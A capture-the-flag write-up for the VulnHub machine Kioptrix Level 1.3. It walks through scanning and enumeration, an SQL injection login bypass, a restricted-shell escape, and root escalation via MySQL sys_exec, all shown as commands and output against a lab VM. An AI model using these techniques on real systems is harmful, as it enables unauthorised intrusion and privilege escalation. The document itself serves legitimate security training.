# Information

- Name: Kioptrix: Level 1.3 (#4)
- Date release: 8 Feb 2012
- Author: Kioptrix
- Series: Kioptrix
- Platform: VulnHub
- Link: https://www.vulnhub.com/entry/kioptrix-level-13-4,25/
- Difficulty: Easy

# Write Up

## Enumeration

### Host Discovery
Host Discovery is performed using the tool [arpScan](https://github.com/aalmeidar/Tools/tree/main/arpScan).Several IPs are listed, of which _10.0.2.5_ is the one indicated.
```Console
# python3 main.py -m 2 -r 10.0.2.0/24
[*] 52:54:00:12:35:00 10.0.2.1
[*] 52:54:00:12:35:00 10.0.2.2
[*] 08:00:27:a3:f2:2f 10.0.2.3
[*] 08:00:27:09:1f:1b 10.0.2.5
```
### Port Scanning 
Port Scanning is performed with [portScan](https://github.com/aalmeidar/Tools/tree/main/portScan) and _nmap_. First, the entire port range is scanned to find those that are open.

The following ports are found:
```Console
# python3 portScanner.py -i 10.0.2.5
[*] Port 22 (ssh) open
[*] Port 80 (http) open
[*] Port 139 (netbios-ssn) open
[*] Port 445 (microsoft-ds) open
```
Three main attack vectors are observed: SSH, Web and SMB. The versions of the respective services are scanned with nmap:

```Console
# nmap -sV -p22,80,139,445 10.0.2.5
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-29 17:29 UTC
Nmap scan report for 10.0.2.5 (10.0.2.5)
Host is up (0.00028s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:09:1F:1B (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.57 seconds
```
#### SSH
Port 22 is running OpenSSH 4.7p1 in Debian 8ubuntu1.2. In this version users can be enumerated to see if they exist in the system with [OpenSSH 2.3 - 7.7 - Username Enumeration](https://www.exploit-db.com/exploits/45233).

#### Web
Port 80 is running Apache httpd 2.2.8. With _whatweb_ ypu can take a quick look at the technologies used. In ths case, nothing interesting but there is a login.

```Console
whatweb http://10.0.2.5
http://10.0.2.5 [200 OK] Apache[2.2.8], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch], IP[10.0.2.5], PHP[5.2.4-2ubuntu5.6][Suhosin-Patch], PasswordField[mypassword], X-Powered-By[PHP/5.2.4-2ubuntu5.6]
```
On the web, there is simply a username field and a password field next to a picture of a goat.
![Index](/images/index.png)

After some tests it is observed that the password field is vulnerable to SQLi. For example, if it is tested with _admin_ and _test' or 1=1-- -_ it gives us the following output:
![SQLi Admin](/images/sqli_admin.png)

You could brute force to find valid users via ssh, but it would take more time.
To finish listing the web, you can perform fuzzing to find directories and files. In this case I will use _gobuster_.

```Console
sudo gobuster dir -u http://10.0.2.5 -x php -w /usr/share/wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.5
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/08/29 18:00:24 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 1255]
/images               (Status: 301) [Size: 344] [--> http://10.0.2.5/images/]
/index.php            (Status: 200) [Size: 1255]
/member               (Status: 302) [Size: 220] [--> index.php]
/member.php           (Status: 302) [Size: 220] [--> index.php]
/logout               (Status: 302) [Size: 0] [--> index.php]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/john                 (Status: 301) [Size: 342] [--> http://10.0.2.5/john/]
/robert               (Status: 301) [Size: 344] [--> http://10.0.2.5/robert/]
/server-status        (Status: 403) [Size: 328]

===============================================================
2022/08/29 18:01:00 Finished
===============================================================
```
Users john and robert are found. Accessing john's directory exposes his credentials. It can also be checked by login or SQLi.
![John Directory](/images/john_directory.png)
![John Password](/images/john_password.png)

#### SMB
On the other hand, ports 139 and 445 are running smb. To enumerate them, some nmap scripts intended for this purpose will be used.

```Console
# nmap -p139,445 --script smb-enum-users,smb-enum-shares 10.0.2.5
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-29 18:14 UTC
Nmap scan report for 10.0.2.5 (10.0.2.5)
Host is up (0.00025s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:09:1F:1B (Oracle VirtualBox virtual NIC)

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.0.2.5\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Kioptrix4 server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.0.2.5\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
| smb-enum-users:
|   KIOPTRIX4\john (RID: 3002)
|     Full name:   ,,,
|     Flags:       Normal user account
|   KIOPTRIX4\loneferret (RID: 3000)
|     Full name:   loneferret,,,
|     Flags:       Normal user account
|   KIOPTRIX4\nobody (RID: 501)
|     Full name:   nobody
|     Flags:       Normal user account
|   KIOPTRIX4\robert (RID: 3004)
|     Full name:   ,,,
|     Flags:       Normal user account
|   KIOPTRIX4\root (RID: 1000)
|     Full name:   root
|_    Flags:       Normal user account

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
```
- Found users: john, loneferret, nobody, robert and root. 
- Shared directories found: IPC$ and print$

## Exploitation
First of all, you can check if the obtained credentials access the ssh service. Entering the username _john_ and the password _MyNameIsJohn_ returns a shell. The shell is an _lshell_, that is, it is a restricted shell where only the commands listed with the _?_ or _help_ command can be executed. 
```Console
ssh -oHostKeyAlgorithms=+ssh-dss john@10.0.2.5
```

To escape from lshell (0.9.5) and start a bash you can run:
```Console
echo os.system('/bin/bash')
```
With this we would already be inside the machine and we could access the root directory.

## Privilege Escalation

It can be seen that the mysql service exists in the system. It tries to login as root without a password and is successful. Via mysql_udf we can change john's groups. 
If you list /etc/passwd you can see a group _admin_.

```Console
john@Kioptrix4:~$ mysql -u root
```

```Console
mysql> select  sys_exec('usermod -a -G admin john');
+-------------------------------------+
| sys_exec('usermod -a -G root john') |
+-------------------------------------+
| NULL                                |
+-------------------------------------+
1 row in set (0.05 sec)

mysql> exit
Bye
john@Kioptrix4:~$ sudo su
[sudo] password for john:
root@Kioptrix4:/home/john# whoami
root
```
